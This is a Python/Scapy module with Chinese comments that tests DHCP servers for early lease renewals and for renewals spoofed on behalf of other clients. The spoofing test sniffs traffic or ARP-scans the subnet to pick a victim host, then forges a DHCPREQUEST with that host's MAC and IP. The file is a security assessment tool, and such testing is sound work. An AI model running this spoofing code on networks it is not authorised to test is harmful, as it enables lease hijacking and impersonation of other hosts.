"""
DHCP 租约续订时序攻击测试模块

这个模块测试DHCP服务器对非标准租约续订请求的处理能力。
标准的DHCP续约流程规定:
- 客户端应在T1时间点(通常为租约时间的50%)发送单播DHCPREQUEST进行续约
- 如未得到响应，在T2时间点(通常为租约时间的87.5%)发送广播DHCPREQUEST
- 服务器收到续约请求后，需要验证客户端身份和时序合理性

本测试模块包括两种非标准场景:
1. 过早续约: 客户端在获取IP后立即请求续约(而非等到T1时间点)
2. 第三方伪造续约: 攻击者伪装成其他客户端请求续约
"""

from scapy.all import *
import logging
import random
import time
import socket
import struct

def test_early_renewal(interface_name):
    """
    测试DHCP服务器对过早续约请求的处理
    
    测试策略:
    1. 正常完成DORA获取IP和租约
    2. 立即发送单播DHCPREQUEST请求续约(远早于T1时间点)
    3. 分析服务器的响应
    
    返回:
    dict: 包含测试结果的字典
    """
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    dhcp_socket = None
    
    try:
        mac_addr = get_if_hwaddr(interface_name)
        xid = random.randint(1, 0xFFFFFFFF)
        
        # --- 1. 首先完成标准的DORA流程获取IP ---
        dhcp_discover = (
            Ether(src=mac_addr, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=mac2str(mac_addr), xid=xid, flags='B') /
            DHCP(options=[
                ("message-type", "discover"),
                ("end")
            ])
        )
        
        dhcp_socket = conf.L2listen(type=ETH_P_ALL, iface=interface_name, filter="udp and (port 67 or port 68)")
        sendp(dhcp_discover, iface=interface_name, verbose=False)
        
        # --- 等待 DHCP Offer ---
        dhcp_offer = None
        start_time = time.time()
        while time.time() - start_time < 10:
            packets = dhcp_socket.sniff(timeout=1, count=5)
            for pkt in packets:
                if DHCP in pkt and BOOTP in pkt and pkt[BOOTP].xid == xid:
                    if any(opt[1] == 2 for opt in pkt[DHCP].options if opt[0] == 'message-type'):
                        dhcp_offer = pkt
                        break
            if dhcp_offer:
                break
                
        if dhcp_offer is None:
            return {"status": "失败", "reason": "未收到 DHCP OFFER"}
            
        offered_ip = dhcp_offer[BOOTP].yiaddr
        server_ip = None
        for opt in dhcp_offer[DHCP].options:
            if opt[0] == 'server_id':
                server_ip = opt[1]
                break
        
        if server_ip is None:
            return {"status": "失败", "reason": "在DHCP OFFER包中未找到 'server_id' 选项"}
        
        # --- 发送 DHCP Request ---
        dhcp_request = (
            Ether(src=mac_addr, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=mac2str(mac_addr), xid=xid, flags='B') /
            DHCP(options=[
                ("message-type", "request"),
                ("requested_addr", offered_ip),
                ("server_id", server_ip),
                ("end")
            ])
        )
        
        sendp(dhcp_request, iface=interface_name, verbose=False)
        
        # --- 等待 DHCP ACK ---
        dhcp_ack = None
        start_time = time.time()
        while time.time() - start_time < 10:
            packets = dhcp_socket.sniff(timeout=1, count=5)
            for pkt in packets:
                if DHCP in pkt and BOOTP in pkt and pkt[BOOTP].xid == xid:
                    if any(opt[1] == 5 for opt in pkt[DHCP].options if opt[0] == 'message-type'):
                        dhcp_ack = pkt
                        break
            if dhcp_ack:
                break
                
        if dhcp_ack is None:
            return {"status": "失败", "reason": "未收到 DHCP ACK"}
            
        assigned_ip = dhcp_ack[BOOTP].yiaddr
        
        # 获取租约时间
        lease_time = None
        for opt in dhcp_ack[DHCP].options:
            if opt[0] == 'lease_time':
                lease_time = opt[1]
                break
                
        if lease_time is None:
            lease_time = 86400  # 默认为1天
        
        # 计算T1和T2时间点（理论上的续约时间点）
        t1_time = lease_time * 0.5  # 租约时间的50%
        t2_time = lease_time * 0.875  # 租约时间的87.5%
        
        print(f"  -- 成功获取IP: {assigned_ip}")
        print(f"  -- 租约时间: {lease_time}秒")
        print(f"  -- 标准续约时间点T1: {t1_time}秒后")
        print(f"  -- 但我们将在获取IP后立即尝试续约...")
        
        # 关闭现有socket，重新创建一个用于监听续约响应
        if dhcp_socket:
            dhcp_socket.close()
        
        # 等待2秒确保服务器处理完初始租约
        time.sleep(2)
        
        # --- 2. 构造和发送过早的续约请求（单播） ---
        renewal_xid = random.randint(1, 0xFFFFFFFF)
        
        # 创建单播续约请求（直接发给服务器而非广播）
        early_renewal = (
            Ether(src=mac_addr, dst="ff:ff:ff:ff:ff:ff") /  # 以太网层还是广播，因为我们不知道服务器的MAC
            IP(src=assigned_ip, dst=server_ip) /           # IP层使用已分配的IP作为源地址
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=mac2str(mac_addr), xid=renewal_xid, ciaddr=assigned_ip) /  # 关键: 设置ciaddr
            DHCP(options=[
                ("message-type", "request"),  # 续约请求不包含requested_addr选项
                ("server_id", server_ip),
                ("end")
            ])
        )
        
        dhcp_socket = conf.L2listen(type=ETH_P_ALL, iface=interface_name, filter="udp and (port 67 or port 68)")
        sendp(early_renewal, iface=interface_name, verbose=False)
        
        # --- 等待服务器对续约请求的响应 ---
        renewal_response = None
        response_type = None
        start_time = time.time()
        
        while time.time() - start_time < 10:
            packets = dhcp_socket.sniff(timeout=1, count=5)
            for pkt in packets:
                if DHCP in pkt and BOOTP in pkt and pkt[BOOTP].xid == renewal_xid:
                    for opt in pkt[DHCP].options:
                        if opt[0] == 'message-type':
                            if opt[1] == 5:  # ACK
                                renewal_response = pkt
                                response_type = "ACK"
                                break
                            elif opt[1] == 6:  # NAK
                                renewal_response = pkt
                                response_type = "NAK"
                                break
            if renewal_response:
                break
                
        # --- 3. 分析结果 ---
        if renewal_response is None:
            return {
                "status": "成功",
                "assigned_ip": assigned_ip,
                "lease_time": lease_time,
                "renewal_response": "无响应",
                "early_renewal_permitted": "否",
                "timing_strictness": "高 (忽略过早续约请求)",
                "timing_security": "高",
                "time_validation": "是",
                "notes": "服务器正确忽略了过早的续约请求，这符合最佳安全实践"
            }
        
        # 如果收到了响应
        if response_type == "ACK":
            # 服务器接受了过早续约请求
            new_lease_time = None
            for opt in renewal_response[DHCP].options:
                if opt[0] == 'lease_time':
                    new_lease_time = opt[1]
                    break
            
            return {
                "status": "成功",
                "assigned_ip": assigned_ip,
                "original_lease_time": lease_time,
                "renewal_response": "ACK",
                "new_lease_time": new_lease_time if new_lease_time else "未知",
                "early_renewal_permitted": "是",
                "timing_strictness": "低 (接受过早续约请求)",
                "timing_security": "低",
                "time_validation": "否",
                "notes": "服务器接受了过早的续约请求，这可能表明它没有进行时序验证"
            }
        else:  # NAK
            # 服务器明确拒绝了过早续约
            return {
                "status": "成功",
                "assigned_ip": assigned_ip,
                "lease_time": lease_time,
                "renewal_response": "NAK",
                "early_renewal_permitted": "否",
                "timing_strictness": "高 (明确拒绝过早续约请求)",
                "timing_security": "高",
                "time_validation": "是",
                "notes": "服务器通过发送NAK明确拒绝了过早的续约请求，这表明它进行了时序验证"
            }
    
    except Exception as e:
        return {"status": "异常", "reason": str(e)}
    finally:
        if dhcp_socket:
            dhcp_socket.close()

def test_spoofed_renewal(interface_name):
    """
    测试DHCP服务器对第三方伪造续约请求的处理
    
    测试策略:
    1. 首先监听网络上的DHCP消息，获取现有客户端的IP和MAC
    2. 使用我们自己的MAC构造一个续约请求，但ciaddr设置为其他客户端的IP
    3. 分析服务器是否拒绝这个伪造的续约
    
    返回:
    dict: 包含测试结果的字典
    """
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    dhcp_socket = None
    
    try:
        # --- 1. 获取测试使用的MAC地址 ---
        our_mac = get_if_hwaddr(interface_name)
        
        # --- 2. 方法1：监听网络以捕获现有客户端信息 ---
        print("  -- 监听网络以捕获现有DHCP客户端信息...")
        dhcp_socket = conf.L2listen(type=ETH_P_ALL, iface=interface_name, filter="udp and (port 67 or port 68)")
        
        victim_info = None
        start_time = time.time()
        while time.time() - start_time < 20:  # 监听20秒
            packets = dhcp_socket.sniff(timeout=1, count=10)
            for pkt in packets:
                if DHCP in pkt and BOOTP in pkt:
                    # 寻找ACK包，这样可以获取到已分配的IP和客户端MAC
                    for opt in pkt[DHCP].options:
                        if opt[0] == 'message-type' and opt[1] == 5:  # ACK
                            victim_mac = pkt[BOOTP].chaddr[:6].hex()
                            victim_mac = ':'.join(victim_mac[i:i+2] for i in range(0, 12, 2))
                            victim_ip = pkt[BOOTP].yiaddr
                            server_ip = None
                            
                            # 获取服务器IP
                            for server_opt in pkt[DHCP].options:
                                if server_opt[0] == 'server_id':
                                    server_ip = server_opt[1]
                                    break
                            
                            if server_ip and victim_ip != "0.0.0.0" and victim_mac != our_mac:
                                victim_info = {
                                    "mac": victim_mac,
                                    "ip": victim_ip,
                                    "server_ip": server_ip
                                }
                                break
                    if victim_info:
                        break
            if victim_info:
                break
        
        # --- 3. 如果方法1失败，尝试方法2：使用DHCP之外的方式获取IP-MAC映射 ---
        if not victim_info:
            print("  -- 未能通过监听捕获到DHCP客户端，尝试其他方式...")
            
            # 尝试使用ARP请求获取本地网络中的活跃主机
            local_ip = None
            for iface in get_if_list():
                if iface == interface_name:
                    try:
                        local_ip = get_if_addr(iface)
                        break
                    except:
                        pass
            
            if local_ip:
                # 解析IP地址的前三个八位字节作为网络ID
                network_prefix = '.'.join(local_ip.split('.')[:3])
                
                # 创建一个潜在目标列表，排除我们自己
                potential_targets = []
                for i in range(1, 255):
                    target_ip = f"{network_prefix}.{i}"
                    if target_ip != local_ip:
                        potential_targets.append(target_ip)
                
                # 选择一些潜在目标进行ARP探测
                targets_to_probe = random.sample(potential_targets, min(10, len(potential_targets)))
                
                for target_ip in targets_to_probe:
                    try:
                        # 发送ARP请求并获取响应
                        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_ip), 
                                     timeout=1, verbose=0, iface=interface_name)
                        
                        if ans:
                            victim_mac = ans[0][1].hwsrc
                            if victim_mac != our_mac:  # 确保不是我们自己
                                victim_info = {
                                    "mac": victim_mac,
                                    "ip": target_ip,
                                    "server_ip": network_prefix + ".1"  # 假设默认网关是服务器
                                }
                                break
                    except:
                        continue
        
        # --- 4. 如果方法1和方法2都失败，则使用模拟数据 ---
        if not victim_info:
            print("  -- 未能找到其他客户端，将使用模拟数据进行测试...")
            # 提取当前网络信息，构造一个合理的模拟目标
            try:
                our_ip = get_if_addr(interface_name)
                network_prefix = '.'.join(our_ip.split('.')[:3])
                
                # 生成一个假的受害者IP，与我们的不同
                victim_last_octet = random.randint(100, 200)
                while network_prefix + f".{victim_last_octet}" == our_ip:
                    victim_last_octet = random.randint(100, 200)
                
                # 生成一个假的受害者MAC地址
                victim_mac_bytes = [random.randint(0, 255) & 0xFE for _ in range(6)]
                victim_mac = ':'.join('%02x' % b for b in victim_mac_bytes)
                
                victim_info = {
                    "mac": victim_mac,
                    "ip": network_prefix + f".{victim_last_octet}",
                    "server_ip": network_prefix + ".1"  # 假设网关是DHCP服务器
                }
                
                print(f"  -- 使用模拟受害者: IP={victim_info['ip']}, MAC={victim_info['mac']}")
                print(f"  -- 假设服务器IP: {victim_info['server_ip']}")
            except:
                return {"status": "失败", "reason": "无法获取网络信息以构造模拟数据"}
        else:
            print(f"  -- 找到受害者客户端: IP={victim_info['ip']}, MAC={victim_info['mac']}")
            print(f"  -- 服务器IP: {victim_info['server_ip']}")
        
        # --- 5. 构造和发送伪造的续约请求 ---
        if dhcp_socket:
            dhcp_socket.close()
            
        spoofed_xid = random.randint(1, 0xFFFFFFFF)
        
        # 创建一个单播的伪造续约请求
        # 关键点:
        # 1. 源MAC是我们自己的，但目标MAC是服务器的（我们需要能收到响应）
        # 2. 源IP是我们自己的（局域网内的通信主要靠MAC，IP可能不会被严格检查）
        # 3. BOOTP层的chaddr是受害者的MAC，ciaddr是受害者的IP
        
        # 首先获取服务器的MAC地址
        server_mac = None
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=victim_info["server_ip"]), 
                         timeout=2, verbose=0, iface=interface_name)
            if ans:
                server_mac = ans[0][1].hwsrc
            else:
                # 如果获取服务器MAC失败，使用广播
                server_mac = "ff:ff:ff:ff:ff:ff"
        except:
            server_mac = "ff:ff:ff:ff:ff:ff"
        
        # 构造伪造的续约请求
        spoofed_renewal = (
            Ether(src=our_mac, dst=server_mac) /
            IP(src=get_if_addr(interface_name), dst=victim_info["server_ip"]) /  # 使用我们自己的源IP
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=mac2str(victim_info["mac"]), xid=spoofed_xid, ciaddr=victim_info["ip"]) / # 伪装受害者
            DHCP(options=[
                ("message-type", "request"),  # 续约请求
                ("server_id", victim_info["server_ip"]),
                ("end")
            ])
        )
        
        print(f"  -- 发送伪造的续约请求 (XID: {hex(spoofed_xid)})")
        dhcp_socket = conf.L2listen(type=ETH_P_ALL, iface=interface_name, filter="udp and (port 67 or port 68)")
        sendp(spoofed_renewal, iface=interface_name, verbose=False)
        
        # --- 6. 等待服务器对伪造续约请求的响应 ---
        spoofed_response = None
        response_type = None
        start_time = time.time()
        
        while time.time() - start_time < 10:
            packets = dhcp_socket.sniff(timeout=1, count=5)
            for pkt in packets:
                if DHCP in pkt and BOOTP in pkt and pkt[BOOTP].xid == spoofed_xid:
                    for opt in pkt[DHCP].options:
                        if opt[0] == 'message-type':
                            if opt[1] == 5:  # ACK
                                spoofed_response = pkt
                                response_type = "ACK"
                                break
                            elif opt[1] == 6:  # NAK
                                spoofed_response = pkt
                                response_type = "NAK"
                                break
            if spoofed_response:
                break
                
        # --- 7. 分析结果 ---
        if spoofed_response is None:
            return {
                "status": "成功",
                "spoofed_ip": victim_info["ip"],
                "spoofed_mac": victim_info["mac"],
                "renewal_response": "无响应",
                "spoofing_possible": "否",
                "source_validation": "是",
                "security_level": "高",
                "notes": "服务器正确地忽略了来自错误源的续约请求"
            }
        
        # 如果收到了响应
        if response_type == "ACK":
            # 服务器接受了伪造的续约请求，这是一个安全问题
            return {
                "status": "成功",
                "spoofed_ip": victim_info["ip"],
                "spoofed_mac": victim_info["mac"],
                "renewal_response": "ACK",
                "spoofing_possible": "是",
                "source_validation": "否",
                "security_level": "低",
                "notes": "安全风险: 服务器接受了伪造的续约请求，没有验证源IP与ciaddr的一致性"
            }
        else:  # NAK
            # 服务器明确拒绝了伪造续约
            return {
                "status": "成功",
                "spoofed_ip": victim_info["ip"],
                "spoofed_mac": victim_info["mac"],
                "renewal_response": "NAK",
                "spoofing_possible": "否",
                "source_validation": "是",
                "security_level": "高",
                "notes": "服务器通过发送NAK拒绝了伪造的续约请求"
            }
    
    except Exception as e:
        return {"status": "异常", "reason": str(e)}
    finally:
        if dhcp_socket:
            dhcp_socket.close()

def test_renewal_timing(interface_name):
    """
    执行完整的租约续订时序攻击测试套件
    
    测试两个场景:
    1. 过早续约: 测试服务器是否允许在租约刚开始时就续约
    2. 伪造续约: 测试服务器是否允许第三方代替其他客户端续约
    
    返回:
    dict: 包含测试结果的字典
    """
    # 测试过早续约场景
    early_renewal_result = test_early_renewal(interface_name)
    
    # 如果第一个测试失败，直接返回失败结果
    if early_renewal_result["status"] == "失败":
        return {
            "status": "失败",
            "reason": "过早续约测试失败: " + early_renewal_result.get("reason", "未知原因"),
            "time_validation": "未知"
        }
    
    # 测试伪造续约场景
    spoofed_renewal_result = test_spoofed_renewal(interface_name)
    
    # 汇总结果
    time_security_level = "未知"
    space_security_level = "未知"
    
    if early_renewal_result.get("timing_security") == "高":
        time_security_level = "高"
    elif early_renewal_result.get("timing_security") == "低":
        time_security_level = "低"
        
    if spoofed_renewal_result.get("security_level") == "高":
        space_security_level = "高"
    elif spoofed_renewal_result.get("security_level") == "低":
        space_security_level = "低"
        
    # 计算综合安全等级
    overall_security = "中"
    if time_security_level == "高" and space_security_level == "高":
        overall_security = "高"
    elif time_security_level == "低" and space_security_level == "低":
        overall_security = "低"
    
    return {
        "status": "成功",
        "time_validation": early_renewal_result.get("time_validation", "未知"),
        "source_validation": spoofed_renewal_result.get("source_validation", "未知"),
        "early_renewal_permitted": early_renewal_result.get("early_renewal_permitted", "未知"),
        "spoofing_possible": spoofed_renewal_result.get("spoofing_possible", "未知"),
        "time_security_level": time_security_level,
        "space_security_level": space_security_level,
        "overall_renewal_security": overall_security,
        "early_renewal_details": early_renewal_result,
        "spoofed_renewal_details": spoofed_renewal_result
    }
